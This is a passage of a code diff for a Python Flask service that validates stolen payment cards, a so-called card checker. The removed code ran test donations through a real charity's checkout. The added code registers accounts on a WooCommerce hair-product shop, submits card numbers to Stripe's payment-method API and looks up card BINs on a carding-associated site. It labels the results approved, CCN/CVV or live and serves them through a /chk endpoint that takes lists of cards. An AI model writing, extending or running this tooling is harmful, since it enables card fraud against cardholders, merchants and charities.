-            'fixed_fot_percent': 5,
-            'fixed_fot_enabled': False,
-            'fee_on_top_amount': None,
-            'gross_adjustment': {},
-            'dedication': None,
-            'company_name': None,
-            'member_first_name': user_info['member_first_name'],
-            'member_last_name': user_info['member_last_name'],
-            'employer_match': None,
-            'token': '0cAFcWeA6x9DL6lh1wG7HEqvHtxm3Lc83XJEWBlSDW4otltq1ilKwX7uFkC4Ru5SuU42zBcaH3JMD68iEEV6slF4GxF2uvu57ezauRtPODBrKgLwvfyGwV59Qj5wCyzzEtyezHJ0MBn0-P2EILMxmC_ZUEwbdh7W5_gm-J_LWo5gAF1CVhSB43m5eYpBZ-vZleSIB_hhE_DECiSq6KBJqvlLm6MfoXMhcIZrNAba5Cr9woKj6D7c9fgsXOXkBJYGqWkHL674dPLMMU559Tkb_ZUrhHgo1x1rrlerBv-4M8S5lL_S_2ZpzcZrEE8njbq8X6H0b8RwbKr-TQ3z4FTsn_q8NckTJTDwGxCPRsIFgMkmOQx5jSC2iTOKDE57aURjfQ_AxlTkgQ7RSkCsDx_AlVFCsjIP1RHXcJVgCtQGpwnPAKt_2z5QCv2rxGsyGZdnnPYcbnLXHE_27uJzWFAfB0OPNX-tydOGwR0_M7IcyAcPf5oNexd7vJmqwFijul4P2lnDJ5xuZDjZx1_hF7Jy2qPD9pLt5I9dOxXF7td4CEV3qPC-Ujq2GUyeZ1VhZeDbEuUhefZmlAf4dSWCtuPuYX8W3TrjrWKePkLncuRypXRNFBY22oj4bjMuL0sIg-SNTPOMY8gdL0mdQy90tT_x_oQrxVM1p3axjmeRB7A503Wwjf0djLa3qXXuOVSfkS-4F46_HVkEY6D-og8crZcj7Y-_yixjwkJGA1zc_q7dNgLkuuiWni05wcT102m7NFLh5FftR1jssxU3PCE4HpYAVYddtCdGOsJf08qfdVvl9oN9MwxMFx0-HEv1McAkDpSZ5r3R0e0TEGqONQH2SG9yg6dhjUCebPO7LMZAI0dqOw5iuhRilCNb6AIMJnm-r_OKz559QfuIBdADHQUJeG1K7JWXaEu9qi5DkitBx-0mED_eQ5tGwJUzXYqRtQiqUbZEyCKhnDWfbnRSMucrQWZXeBsqVIuQughPOXdHa8DEGsOof1Xr_5ZE3NSoOcV9wOj4ZNWXlqZQrTfxVBNmgDC8lVnbIPdO_mATQPCF6iErKTzKkwn-vLclRwEKbDAngMz-cdDIMCdN_va3t6EMHEAiyooqblIFOWS30fXpGhnvGirdjPDd5R3dlXlNVsmGQPOk9TprmX85yI8KOtwWActNw9m6dNjYaJ5T_CKzYBHzhascfus6pkSLAxkBfbrhlAKx9NAbjoTb0vUBOeJCCGqCJIJgd_C8249vGIFCSpXtDTUbC4ANdLj2ptKAHJU01EZI5DoiChfWn7EOB7Vcm6JDOUdBAPf4kzdGfqopxztbwxLnCjrbQ96MnOamdZ3b2WIsQFFKhf3yHzrss40tSsUYnhCE4L9j_5PwWboPk-oGt3xeyT-b3uxmy9ZFFRMXPTSUb3yO4M01E9cGA73MvKetpW0rVsjM0DMNXjv5PYMmTiLcrZ713DbIk6qzes3J_Eg1Ec3uuhNiskBzntPekx7nuOxSLyin5RO97QdpdAgrf1suQS6bbIE_en9gRhJAoSpGKl7tX7-aJFFNbWaxT6YkpuJcJlKHdcDTFgCj8gRNXS9NaFHLlBlASpC_xHcA02SWuAaSeQFcsYZASGtJ5WMCrDYPTQ__8RNAGVLFE-H5TBVITxUFt3SJSs4kgrpLVxiOKohHrfgooXHTuwCWLTecpiP2Mwvj_KVrgI5mQg2jMRsz22czaBWDtf0Uw_XPRkTRbkN2QDS4sPK0_OOANWdomkVwE-MltwmxKXAGccexwG49JfuoFH9RcKxbAnEV08e0sb0l2EROC_Ve2Brd433IFPE-2MtJiAPhSYEQ',
-            'dafTransactionDetails': {},
-        }
-        
-        return requests.post(
-            'https://donate.wck.org/frs-api/campaign/312884/checkout',
-            cookies=cookies,
-            headers=headers,
-            json=json_data,
-            timeout=30
-        )
+        try:
+            response = requests.get(f"https://bins.antipublic.cc/bins/{bin}", headers=headers, timeout=5, verify=False)
+            if response.status_code != 200:
+                return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
+            
+            data = response.json()
+            
+            scheme = data.get('brand', 'Unknown')
+            bank = data.get('bank', 'Unknown')
+            country = data.get('country_name', 'Unknown')
+            
+            return {
+                'scheme': self.format_scheme(scheme),
+                'bank': bank,
+                'country': country
+            }
+            
+        except:
+            return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
     
-    def categorize_response(self, response_text: str) -> Tuple[str, str]:
-        """Categorize response and extract message"""
+    def categorize_response(self, response_text):
+        """Categorize Stripe response"""
         response = response_text.lower()
         
         approved_keywords = [
@@ -423,7 +459,7 @@ class StripeChargeAPI:
         ]
         
         insufficient_keywords = [
-            "insufficient funds", "insufficient_funds"
+            "insufficient funds", "insufficient_funds", "payment-successfully"
         ]
         
         auth_keywords = [
@@ -432,10 +468,10 @@ class StripeChargeAPI:
 
         ccn_cvv_keywords = [
             "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
-            "incorrect_cvv", "invalid_cvv", "invalid cvv", "security code is invalid",
-            "security code is incorrect", "zip code is incorrect", "zip code is invalid",
-            "card is declined by your bank", "lost_card", "stolen_card",
-            "transaction_not_allowed", "pickup_card"
+            "incorrect_cvv", "invalid_cvv", "invalid cvv", ' "cvv_check": "pass" ',
+            "cvv_check: pass", "security code is invalid", "security code is incorrect",
+            "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
+            "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
         ]
 
         live_keywords = [
@@ -446,168 +482,198 @@ class StripeChargeAPI:
             "declined", "invalid", "failed", "error", "incorrect"
         ]
 
-        # Extract message
-        message = "Unknown response"
-        try:
-            # Try to parse as JSON
-            resp_json = json.loads(response_text)
-            if isinstance(resp_json, dict):
-                # Look for error message
-                if 'message' in resp_json:
-                    message = resp_json['message']
-                elif 'error' in resp_json:
-                    message = resp_json['error']
-                elif 'detail' in resp_json:
-                    message = resp_json['detail']
-        except:
-            # Use first 200 chars as message
-            message = response_text[:200]
-        
-        # Capitalize first letter
-        if message:
-            message = message[0].upper() + message[1:] if len(message) > 1 else message.upper()
-        
-        # Categorize
         if any(kw in response for kw in approved_keywords):
-            return "APPROVED", message
+            return "APPROVED", "🔥"
         elif any(kw in response for kw in ccn_cvv_keywords):
-            return "CCN_CVV", message
+            return "CCN/CVV", "✅"
         elif any(kw in response for kw in live_keywords):
-            return "3D_SECURE", message
+            return "3D LIVE", "✅"
         elif any(kw in response for kw in insufficient_keywords):
-            return "INSUFFICIENT_FUNDS", message
+            return "INSUFFICIENT FUNDS", "💰"
         elif any(kw in response for kw in auth_keywords):
-            return "STRIPE_AUTH", message
+            return "STRIPE AUTH", "✅️"
         elif any(kw in response for kw in declined_keywords):
-            return "DECLINED", message
+            return "DECLINED", "❌"
         else:
-            return "UNKNOWN", message
+            return "UNKNOWN", "❓"
     
-    def process_card(self, card_input: str) -> Dict:
-        """Process a single card and return results"""
-        result = {
-            'status': 'error',
-            'message': 'Unknown error',
-            'bin_info': {},
-            'card_info': {},
-            'response_details': {}
-        }
-        
+    def check_card(self, card_data: Dict, ajax_nonce: str) -> Tuple[str, str]:
+        """Check card using Stripe API"""
         try:
-            # Parse card info
-            card_info = self.parse_card_input(card_input)
-            result['card_info'] = {
-                'number': f"{card_info['ccn'][:6]}******{card_info['ccn'][-4:]}",
-                'expiry': f"{card_info['mm']}/{card_info['yy']}",
-                'brand': 'UNKNOWN'
+            # First request - Stripe API to create payment method
+            headers = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
             }
+
+            # Prepare Stripe data
+            data = f'type=card&card[number]={card_data["ccn"]}&card[cvc]={card_data["cvv"]}&card[exp_year]={card_data["yy"]}&card[exp_month]={card_data["mm"]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ficonichairproducts.com&time_on_page=22151&guid=59935264-a0ad-467b-8c25-e05e6e3941cb5cb1d3&muid=efadee54-caa2-4cbe-abfb-304d69bc865c187523&sid=b8c63ed0-7922-46ba-83f7-2260590ce31aa73df1&key={self.stripe_key}&_stripe_account=acct_1JmxDb2Hh2LP7rQY'
+
+            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
             
-            # BIN lookup
-            bin_info = self.bin_lookup(card_info['ccn'])
-            result['bin_info'] = bin_info
+            if response.status_code != 200:
+                return "STRIPE API ERROR", "❌"
             
-            # Get random user info
-            user_info = self.get_random_user_info()
+            stripe_response = response.json()
             
-            # Create Stripe source
-            stripe_source = self.create_stripe_source(card_info, user_info)
+            if 'id' not in stripe_response:
+                error_msg = stripe_response.get('error', {}).get('message', 'Unknown error')
+                return f"STRIPE: {error_msg}", "❌"
             
-            if not stripe_source:
-                result['message'] = 'Failed to create Stripe source'
-                return result
+            pid = stripe_response["id"]
             
-            # Make donation
-            response = self.make_donation(stripe_source, user_info)
+            # Second request - Create setup intent
+            headers = {
+                'authority': 'iconichairproducts.com',
+                'accept': '*/*',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'origin': 'https://iconichairproducts.com',
+                'referer': 'https://iconichairproducts.com/my-account/add-payment-method/',
+                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            }
+
+            form_data = {
+                'action': 'create_setup_intent',
+                'wcpay-payment-method': pid,
+                '_ajax_nonce': ajax_nonce
+            }
+
+            response = self.session.post(
+                'https://iconichairproducts.com/wp-admin/admin-ajax.php',
+                headers=headers,
+                data=form_data,
+                timeout=30,
+                verify=False
+            )
             
-            # Categorize response
-            status, message = self.categorize_response(response.text)
+            if response.status_code != 200:
+                return "AJAX REQUEST FAILED", "❌"
             
-            result['status'] = status
-            result['message'] = message
-            result['response_details'] = {
-                'status_code': response.status_code,
-                'response_time': datetime.now().isoformat()
+            try:
+                pix = response.json()
+                
+                if pix.get('success'):
+                    return "APPROVED", "🔥"
+                else:
+                    error_msg = pix.get('data', {}).get('error', {}).get('message', 'Unknown error')
+                    category, emoji = self.categorize_response(error_msg)
+                    return f"{category}: {error_msg}", emoji
+                    
+            except json.JSONDecodeError:
+                return "INVALID RESPONSE", "❌"
+                
+        except Exception as e:
+            return f"ERROR: {str(e)}", "❌"
+    
+    def process_card(self, card_string: str) -> Dict:
+        """Process a single card"""
+        try:
+            # Parse card
+            card_data = self.parse_card(card_string)
+            
+            # Get BIN info
+            bin_info = self.get_bin_info(card_data['ccn'][:6])
+            
+            # Register account if needed
+            if not self.account_created:
+                if not self.register_account():
+                    return {
+                        'card': card_string,
+                        'full_response': f"{card_string} --> ACCOUNT REGISTRATION FAILED ❌",
+                        'result': "ACCOUNT REGISTRATION FAILED ❌"
+                    }
+            
+            # Get AJAX nonce
+            ajax_nonce = self.get_ajax_nonce()
+            if not ajax_nonce:
+                return {
+                    'card': card_string,
+                    'full_response': f"{card_string} --> NONCE EXTRACTION FAILED ❌",
+                    'result': "NONCE EXTRACTION FAILED ❌"
+                }
+            
+            # Check card
+            result, emoji = self.check_card(card_data, ajax_nonce)
+            
+            # Build response
+            bin_str = f"{bin_info['scheme']} - {bin_info['bank']} - {bin_info['country']}"
+            full_response = f"{card_string} --> {result} {emoji} | {bin_str}"
+            
+            return {
+                'card': card_string,
+                'full_response': full_response,
+                'result': f"{result} {emoji} | {bin_str}"
             }
             
         except Exception as e:
-            result['message'] = str(e)
-            
-        return result
+            return {
+                'card': card_string,
+                'full_response': f"{card_string} --> ERROR: {str(e)} ❌",
+                'result': f"ERROR: {str(e)} ❌"
+            }
 
-# Initialize the API handler
-stripe_api = StripeChargeAPI()
 
-@app.route('/')
-def home():
-    return jsonify({
-        'service': 'Stripe Charge $1 API',
-        'version': '1.0.0',
-        'endpoints': {
-            '/onedollar': 'Process card charge (GET/POST)',
-            '/health': 'Health check endpoint'
-        },
-        'usage': 'GET /onedollar?chg=ccn|mm|yy|cvv'
-    })
+# Flask API Server
+from flask import Flask, request, jsonify
 
-@app.route('/health')
-def health():
-    return jsonify({
-        'status': 'healthy',
-        'timestamp': datetime.now().isoformat(),
-        'service': 'Stripe Charge API'
-    })
+app = Flask(__name__)
 
-@app.route('/onedollar', methods=['GET', 'POST'])
-def one_dollar():
-    """Process card charge endpoint"""
-    # Get card input from query parameter or JSON body
-    if request.method == 'GET':
-        card_input = request.args.get('chg')
-    else:
-        data = request.get_json(silent=True) or {}
-        card_input = data.get('chg') or request.form.get('chg')
-    
-    if not card_input:
-        return jsonify({
-            'status': 'error',
-            'message': 'No card data provided. Use ?chg=ccn|mm|yy|cvv'
-        }), 400
-    
-    # Process the card
-    result = stripe_api.process_card(card_input)
-    
-    # Format response
-    response_data = {
-        'status': result['status'],
-        'message': result['message'],
-        'bin_info': result['bin_info'],
-        'card_info': result['card_info'],
-        'timestamp': datetime.now().isoformat(),
-        'response': result['response_details']
-    }
-    
-    return jsonify(response_data)
+# Global instance (in production, use proper session management)
+api = StripeAuthAPI()
 
-@app.route('/bin/<bin_number>')
-def bin_lookup_endpoint(bin_number):
-    """Direct BIN lookup endpoint"""
-    if not bin_number.isdigit() or len(bin_number) < 6:
-        return jsonify({
-            'status': 'error',
-            'message': 'Invalid BIN number. Must be at least 6 digits.'
-        }), 400
+@app.route('/chk', methods=['GET'])
+def check_cards():
+    """API endpoint to check cards"""
+    lista = request.args.get('lista', '')
     
-    # Pad with zeros if needed
-    bin_number = bin_number[:6].zfill(6)
+    if not lista:
+        return jsonify({'error': 'No cards provided'}), 400
     
-    # Lookup BIN
-    bin_info = stripe_api.bin_lookup(bin_number)
+    # Split cards by newline
+    cards = lista.strip().split('\n')
     
-    return jsonify({
-        'status': 'success',
-        'bin': bin_info,
-        'timestamp': datetime.now().isoformat()
-    })
+    results = []
+    for card_str in cards:
+        if card_str.strip():
+            result = api.process_card(card_str.strip())
+            results.append(result)
+    
+    return jsonify({'results': results})
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Health check endpoint"""
+    return jsonify({'status': 'online', 'account_created': api.account_created})
 
 if __name__ == '__main__':
+    # Initialize the API
+    print("Initializing Stripe Auth API...")
+    print(f"Base URL: {api.base_url}")
+    
+    # Try to create account first
+    print("Creating account...")
+    if api.register_account():
+        print("Account created successfully!")
+    else:
+        print("Account creation failed, will retry per request")
+    
+    # Start Flask server
+    print("Starting API server on http://0.0.0.0:5000")
     app.run(host='0.0.0.0', port=5000, debug=False)
